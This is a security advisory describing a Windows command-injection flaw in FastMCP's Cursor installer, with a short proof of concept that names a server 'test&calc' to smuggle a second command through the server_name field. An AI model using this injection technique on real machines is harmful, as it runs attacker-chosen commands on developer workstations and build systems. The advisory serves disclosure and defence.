summary: "FastMCP vulnerable to windows command injection in FastMCP Cursor installer via server_name\n\
  ### Summary\nA command-injection vulnerability lets any attacker who can influence the server_name\
  \ field of an MCP execute arbitrary OS commands on Windows hosts that run fastmcp install\
  \ cursor\n\n### Details\n1. generate_cursor_deeplink(server_name, …) embeds server_name verbatim\
  \ in a cursor://…?name= query string.\n2. open_deeplink() is invoked with shell=True only\
  \ on Windows. That calls cmd.exe /c start <deeplink>.\n3. Any cmd metacharacter inside server_name\
  \ (&, |, >, ^, …) escapes the start command and spawns an attacker-chosen process.\n\n###\
  \ PoC\nserver.py \n```\n\nimport random\nfrom fastmcp import FastMCP\n\nmcp = FastMCP(name=\"\
  test&calc\")\n\n@mcp.tool\ndef roll_dice(n_dice: int) -> list[int]:\n    \"\"\"Roll `n_dice`\
  \ 6-sided dice and return the results.\"\"\"\n    return [random.randint(1, 6) for _ in range(n_dice)]\n\
  \nif __name__ == \"__main__\":\n    mcp.run()\n```\n\nthen run in the terminal:\n`fastmcp\
  \ install cursor server.py`\n\n### Impact\nOS Command / Shell Injection (CWE-78)\nEvery Windows\
  \ host that runs fastmcp install cursor is at risk. Developers on their local workstations,\
  \ CI/CD agents and corporate build machines alike."
